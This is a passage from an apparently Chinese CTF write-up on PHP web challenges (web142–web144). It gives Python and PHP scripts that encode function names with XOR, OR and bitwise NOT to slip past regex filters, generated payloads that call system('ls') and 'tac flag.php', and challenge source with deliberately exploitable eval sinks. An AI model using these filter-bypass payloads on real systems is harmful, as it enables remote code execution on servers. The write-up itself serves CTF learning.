<span class="line"><span style="color:#d4d4d4">                s1 += t[</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">5</span><span style="color:#d4d4d4">]  </span><span style="color:#6a9955"># 取可用字符的第二部分</span></span>
<span class="line"><span style="color:#d4d4d4">                s2 += t[</span><span style="color:#b5cea8">6</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">9</span><span style="color:#d4d4d4">]  </span><span style="color:#6a9955"># 取可用字符的第三部分</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">break</span></span>
<span class="line"><span style="color:#d4d4d4">        f.close()</span></span>
<span class="line"><span style="color:#d4d4d4">    output = </span><span style="color:#ce9178">"(</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4"> + s1 + </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">^</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4"> + s2 + </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">)"</span><span style="color:#d4d4d4">  </span><span style="color:#6a9955"># 将第二部分与第三部分异或，得到想要的字符</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> (output)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">while</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">True</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">    param = action(</span><span style="color:#dcdcaa">input</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">[+] your function："</span><span style="color:#d4d4d4">)) + action(</span><span style="color:#dcdcaa">input</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"[+] your command："</span><span style="color:#d4d4d4">)) + </span><span style="color:#ce9178">";"</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(param)</span></span></code></pre></div></div></figure><p><img src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202212310622324.png" srcset="/img/loading/loading.gif" lazyload alt="image-20221231062215252"></p><p>得到命令：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">[+] your function：system</span></span>
<span class="line"><span style="color:#d4d4d4">[+] your command：ls</span></span>
<span class="line"><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%08%</span><span style="color:#ce9178">02</span><span style="color:#569cd6">%08%</span><span style="color:#ce9178">08</span><span style="color:#569cd6">%05%</span><span style="color:#ce9178">0d"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%7b%7b%7b%7c%60%</span><span style="color:#ce9178">60"</span><span style="color:#d4d4d4">)(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%0c</span><span style="color:#ce9178">%08"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%60%</span><span style="color:#ce9178">7b"</span><span style="color:#d4d4d4">)</span><span style="color:#f44747">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">[+] your function：system</span></span>
<span class="line"><span style="color:#d4d4d4">[+] your command：tac flag.php</span></span>
<span class="line"><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%08%</span><span style="color:#ce9178">02</span><span style="color:#569cd6">%08%</span><span style="color:#ce9178">08</span><span style="color:#569cd6">%05%</span><span style="color:#ce9178">0d"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%7b%7b%7b%7c%60%</span><span style="color:#ce9178">60"</span><span style="color:#d4d4d4">)(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%08%</span><span style="color:#ce9178">01</span><span style="color:#569cd6">%03%</span><span style="color:#ce9178">00</span><span style="color:#569cd6">%06%</span><span style="color:#ce9178">0c</span><span style="color:#569cd6">%01%</span><span style="color:#ce9178">07</span><span style="color:#569cd6">%00%</span><span style="color:#ce9178">0b</span><span style="color:#569cd6">%08%</span><span style="color:#ce9178">0b"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"</span><span style="color:#569cd6">%7c%60%</span><span style="color:#ce9178">60</span><span style="color:#569cd6">%20%</span><span style="color:#ce9178">60</span><span style="color:#569cd6">%60%</span><span style="color:#ce9178">60</span><span style="color:#569cd6">%60%</span><span style="color:#ce9178">2e</span><span style="color:#569cd6">%7b%60%</span><span style="color:#ce9178">7b"</span><span style="color:#d4d4d4">)</span><span style="color:#f44747">;</span></span></code></pre></div></div></figure><h4 id="2或"><a class="markdownIt-Anchor" href="#2或"></a> 2. 或</h4><p>其实小改一下上面的两个脚本即可。将 <strong>^</strong> 换成 <strong>|</strong></p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#6a9955"># 字符可用脚本修改处</span></span>
<span class="line"><span style="color:#9cdcfe">$c</span><span style="color:#d4d4d4">=(</span><span style="color:#dcdcaa">urldecode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">)|</span><span style="color:#dcdcaa">urldecode</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$b</span><span style="color:#d4d4d4">)); </span><span style="color:#6a9955"># 将符合条件的字符url解码并异或</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">python</span></span>
<span class="line"><span style="color:#6a9955"># 命令构造脚本生成修改处</span></span>
<span class="line"><span style="color:#d4d4d4">output = </span><span style="color:#ce9178">"(</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4"> + s1 + </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">|</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4"> + s2 + </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\"</span><span style="color:#ce9178">)"</span><span style="color:#d4d4d4">  </span><span style="color:#6a9955"># 将第二部分与第三部分异或，得到想要的字符</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">#### 3.取反</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">取反用的基本上都是不可见字符，正则一般是不用绕的</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955">/**</span></span>
<span class="line"><span style="color:#6a9955"> * @Coding: utf-8</span></span>
<span class="line"><span style="color:#6a9955"> * @Author: yu22x</span></span>
<span class="line"><span style="color:#6a9955"> * @Date:   2022-12-31 06:35:21</span></span>
<span class="line"><span style="color:#6a9955"> * @Last Modified by:   f0ur_lin</span></span>
<span class="line"><span style="color:#6a9955"> * @Last Modified time: 2022-12-31 06:36:27</span></span>
<span class="line"><span style="color:#6a9955"> */</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">fwrite</span><span style="color:#d4d4d4">(STDOUT,</span><span style="color:#ce9178">'[+]your function: '</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$system</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">), </span><span style="color:#ce9178">""</span><span style="color:#d4d4d4">, </span><span style="color:#dcdcaa">fgets</span><span style="color:#d4d4d4">(STDIN)); </span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">fwrite</span><span style="color:#d4d4d4">(STDOUT,</span><span style="color:#ce9178">'[+]your command: '</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$command</span><span style="color:#d4d4d4">=</span><span style="color:#dcdcaa">str_replace</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">array</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\r</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"</span><span style="color:#d7ba7d">\n</span><span style="color:#ce9178">"</span><span style="color:#d4d4d4">), </span><span style="color:#ce9178">""</span><span style="color:#d4d4d4">, </span><span style="color:#dcdcaa">fgets</span><span style="color:#d4d4d4">(STDIN)); </span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">'[*] (~'</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">urlencode</span><span style="color:#d4d4d4">(~</span><span style="color:#9cdcfe">$system</span><span style="color:#d4d4d4">)</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">')(~'</span><span style="color:#d4d4d4">.</span><span style="color:#dcdcaa">urlencode</span><span style="color:#d4d4d4">(~</span><span style="color:#9cdcfe">$command</span><span style="color:#d4d4d4">)</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">');'</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web142（sleep）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$d</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">int</span><span style="color:#d4d4d4">)(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> * </span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4"> * </span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4"> * </span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4"> * </span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4"> * </span><span style="color:#b5cea8">0x36d</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">sleep</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$d</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">0乘以任何数结果都为0</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web143（rce异或绕过）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/[a-z]|[0-9]|</span><span style="color:#d7ba7d">\+</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\-</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\.</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\_</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\|</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\$</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\{</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\}</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\~</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\%</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\&amp;</span><span style="color:#d16969">|</span><span style="color:#d7ba7d">\;</span><span style="color:#d16969">/i'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">                </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'get out hacker!'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> =  </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"return </span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178"> = "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">过滤了或｜还过滤了取反～但是没有过滤小括号。依旧可以用上次的异或处理。只不过v1、v2与v3的运算符号得换成乘法＊这种。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"><span style="color:#d4d4d4">?v1=</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">&amp;&amp;v2=</span><span style="color:#b5cea8">1</span><span style="color:#569cd6">&amp;</span><span style="color:#d4d4d4">v3=*(</span><span style="color:#ce9178">"%0c%06%0c%0b%05%0d"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"%7f%7f%7f%7f%60%60"</span><span style="color:#d4d4d4">)(</span><span style="color:#ce9178">"%0b%01%03%00%06%00"</span><span style="color:#d4d4d4">^</span><span style="color:#ce9178">"%7f%60%60%20%60%2a"</span><span style="color:#d4d4d4">)*</span></span>
<span class="line"><span style="color:#ce9178">```</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">### web144（rce+？：）</span></span>
<span class="line"></span>
<span class="line"><span style="color:#ce9178">```</span><span style="color:#d4d4d4">php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">]) &amp;&amp; </span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v1'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v2'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">String</span><span style="color:#d4d4d4">)</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'v3'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">is_numeric</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">check</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$v3</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">preg_match</span><span style="color:#d4d4d4">(</span><span style="color:#d16969">'/</span><span style="color:#d4d4d4">^</span><span style="color:#d7ba7d">\W</span><span style="color:#d4d4d4">+$</span><span style="color:#d16969">/'</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$v2</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4"> =  </span><span style="color:#dcdcaa">eval</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"return </span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"</span><span style="color:#9cdcfe">$v1$v3$v2</span><span style="color:#ce9178"> = "</span><span style="color:#d4d4d4">.</span><span style="color:#9cdcfe">$code</span><span style="color:#d4d4d4">;</span></span>
